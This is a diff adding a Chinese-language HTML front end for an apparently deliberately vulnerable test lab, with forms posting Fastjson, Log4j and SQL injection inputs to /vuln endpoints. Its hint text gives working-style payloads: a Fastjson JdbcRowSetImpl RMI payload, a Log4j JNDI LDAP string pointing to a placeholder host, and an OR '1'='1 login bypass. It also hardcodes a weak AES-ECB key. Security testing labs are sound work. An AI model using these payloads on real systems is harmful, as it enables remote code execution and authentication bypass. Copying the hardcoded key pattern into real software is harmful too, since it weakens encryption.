@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>漏洞测试平台</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
+        .container { margin-bottom: 30px; padding: 15px; border: 1px solid #ccc; border-radius: 5px; }
+        input, textarea, button { margin: 5px 0; padding: 8px; width: 100%; box-sizing: border-box; }
+        button { background-color: #4CAF50; color: white; border: none; cursor: pointer; border-radius: 3px; }
+        button:hover { background-color: #45a049; }
+        h2 { color: #333; margin-top: 0; }
+        .result { margin-top: 10px; padding: 10px; border: 1px solid #eee; border-radius: 3px; background-color: #f9f9f9; white-space: pre-wrap; }
+        .tip { font-size: 12px; color: #666; margin: 3px 0; }
+    </style>
+</head>
+<body>
+<h1>漏洞测试平台</h1>
+
+<!-- 1. Fastjson反序列化测试 -->
+<div class="container">
+    <h2>1. Fastjson反序列化测试</h2>
+    <div class="tip">提示：输入恶意JSON payload，例如 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xxx:1099/Exploit","autoCommit":true}</div>
+    <textarea id="fastjsonInput" rows="4" placeholder='输入JSON payload'></textarea>
+    <button onclick="testFastjson()">执行测试</button>
+    <div id="fastjsonResult" class="result"></div>
+</div>
+
+<!-- 2. Log4j反序列化测试 -->
+<div class="container">
+    <h2>2. Log4j反序列化测试</h2>
+    <div class="tip">提示：输入JNDI注入payload，例如 ${jndi:ldap://xxx:1389/Exploit}</div>
+    <input type="text" id="log4jInput" placeholder='输入Log4j payload'>
+    <button onclick="testLog4j()">执行测试</button>
+    <div id="log4jResult" class="result"></div>
+</div>
+
+<!-- 3. AES加密的Fastjson反序列化测试 -->
+<div class="container">
+    <h2>3. AES加密的Fastjson测试</h2>
+    <div class="tip">提示：输入JSON payload，将自动AES加密后提交（密钥：1234567890123456）</div>
+    <textarea id="aesFastjsonInput" rows="4" placeholder='输入要加密的JSON payload'></textarea>
+    <button onclick="encryptAndTestAesFastjson()">加密并测试</button>
+    <div id="aesFastjsonResult" class="result"></div>
+</div>
+
+<!-- 4. AES加密的Log4j反序列化测试 -->
+<div class="container">
+    <h2>4. AES加密的Log4j测试</h2>
+    <div class="tip">提示：输入Log4j payload，将自动AES加密后提交（密钥：1234567890123456）</div>
+    <input type="text" id="aesLog4jInput" placeholder='输入要加密的Log4j payload'>
+    <button onclick="encryptAndTestAesLog4j()">加密并测试</button>
+    <div id="aesLog4jResult" class="result"></div>
+</div>
+
+<!-- 5. AES加密的SQL注入登录测试 -->
+<div class="container">
+    <h2>5. AES加密的SQL注入登录测试</h2>
+    <div class="tip">提示：输入SQL注入语句，例如 用户名：admin' OR '1'='1，密码：任意（将自动AES加密）</div>
+    <input type="text" id="loginUser" placeholder="用户名（可输入注入语句）">
+    <input type="password" id="loginPass" placeholder="密码（可输入注入语句）">
+    <button onclick="testAesLogin()">登录测试</button>
+    <div id="loginResult" class="result"></div>
+</div>
+
+<!-- 国内CDN引入 -->
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+
+<script>
+    // 验证 CryptoJS 是否加载成功
+    if (typeof CryptoJS === 'undefined') {
+        alert("警告：crypto-js 库加载失败！请检查网络或更换CDN链接。");
+    }
+
+    // AES加密配置（与后端完全一致）
+    const AES_CONFIG = {
+        KEY: "1234567890123456", // 16位密钥（AES-128）
+        MODE: CryptoJS.mode.ECB,  // 加密模式
+        PADDING: CryptoJS.pad.Pkcs7 // 填充方式（兼容后端PKCS5）
+    };
+
+    /**
+     * 真实AES加密（国内CDN版）
+     */
+    function aesEncrypt(content) {
+        try {
+            const key = CryptoJS.enc.Utf8.parse(AES_CONFIG.KEY);
+            const encrypted = CryptoJS.AES.encrypt(
+                content,
+                key,
+                { mode: AES_CONFIG.MODE, padding: AES_CONFIG.PADDING }
+            );
+            return encrypted.toString();
+        } catch (error) {
+            throw new Error("加密异常：" + error.message);
+        }
+    }
+
+    // 1. 测试Fastjson反序列化漏洞（不变）
+    async function testFastjson() {
+        const input = document.getElementById("fastjsonInput").value.trim();
+        const resultDom = document.getElementById("fastjsonResult");
+
+        if (!input) {
+            resultDom.textContent = "错误：请输入JSON payload";
+            return;
+        }
+
+        try {
+            const response = await fetch("/vuln/fastjson", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: input
+            });
+            const result = await response.text();
+            resultDom.textContent = "测试结果：\n" + result;
+        } catch (error) {
+            resultDom.textContent = "测试失败：\n" + error.message;
+        }
+    }
+
+    // 2. 测试Log4j反序列化漏洞（不变）
+    async function testLog4j() {
+        const input = document.getElementById("log4jInput").value.trim();
+        const resultDom = document.getElementById("log4jResult");
+
+        if (!input) {
+            resultDom.textContent = "错误：请输入Log4j payload";
+            return;
+        }
+
+        try {
+            const response = await fetch("/vuln/log4j", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `input=${encodeURIComponent(input)}` // 改为请求体传输
+            });
+            const result = await response.text();
+            resultDom.textContent = "测试结果：\n" + result;
+        } catch (error) {
+            resultDom.textContent = "测试失败：\n" + error.message;
+        }
+    }
+
+    // 3. 测试AES+Fastjson漏洞（核心修改：请求体传输）
+    async function encryptAndTestAesFastjson() {
+        const input = document.getElementById("aesFastjsonInput").value.trim();
+        const resultDom = document.getElementById("aesFastjsonResult");
+
+        if (!input) {
+            resultDom.textContent = "错误：请输入要加密的JSON payload";
+            return;
+        }
+
+        try {
+            const encrypted = aesEncrypt(input);
+            // 改为请求体传输（form-data格式）
+            const response = await fetch("/vuln/aes/fastjson", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `encryptedJson=${encodeURIComponent(encrypted)}`
+            });
+            const result = await response.text();
+            resultDom.textContent = `加密后的密文：\n${encrypted}\n\n测试结果：\n${result}`;
+        } catch (error) {
+            resultDom.textContent = "测试失败：\n" + error.message;
+        }
+    }
+
+    // 4. 测试AES+Log4j漏洞（核心修改：请求体传输）
+    async function encryptAndTestAesLog4j() {
+        const input = document.getElementById("aesLog4jInput").value.trim();
+        const resultDom = document.getElementById("aesLog4jResult");
+
+        if (!input) {
+            resultDom.textContent = "错误：请输入要加密的Log4j payload";
+            return;
+        }
+
+        try {
+            const encrypted = aesEncrypt(input);
+            // 改为请求体传输（form-data格式）
+            const response = await fetch("/vuln/aes/log4j", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `encryptedInput=${encodeURIComponent(encrypted)}`
+            });
+            const result = await response.text();
+            resultDom.textContent = `加密后的密文：\n${encrypted}\n\n测试结果：\n${result}`;
+        } catch (error) {
+            resultDom.textContent = "测试失败：\n" + error.message;
+        }
+    }
+
+    // 5. 测试AES+SQL注入登录（核心修改：请求体传输）
+    async function testAesLogin() {
+        const username = document.getElementById("loginUser").value.trim();
+        const password = document.getElementById("loginPass").value.trim();
+        const resultDom = document.getElementById("loginResult");
+
+        if (!username || !password) {
+            resultDom.textContent = "错误：用户名和密码不能为空";
+            return;
+        }
+
+        try {
+            const encryptedUser = aesEncrypt(username);
+            const encryptedPass = aesEncrypt(password);
+            // 改为请求体传输（form-data格式，多个参数用&连接）
+            const response = await fetch("/vuln/aes/login", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `encryptedUser=${encodeURIComponent(encryptedUser)}&encryptedPass=${encodeURIComponent(encryptedPass)}`
+            });
+            const result = await response.text();
+            resultDom.textContent = `加密后用户名：\n${encryptedUser}\n\n加密后密码：\n${encryptedPass}\n\n登录结果：\n${result}`;
+        } catch (error) {
+            resultDom.textContent = "登录测试失败：\n" + error.message;
+        }
+    }
+</script>
+</body>
+</html>
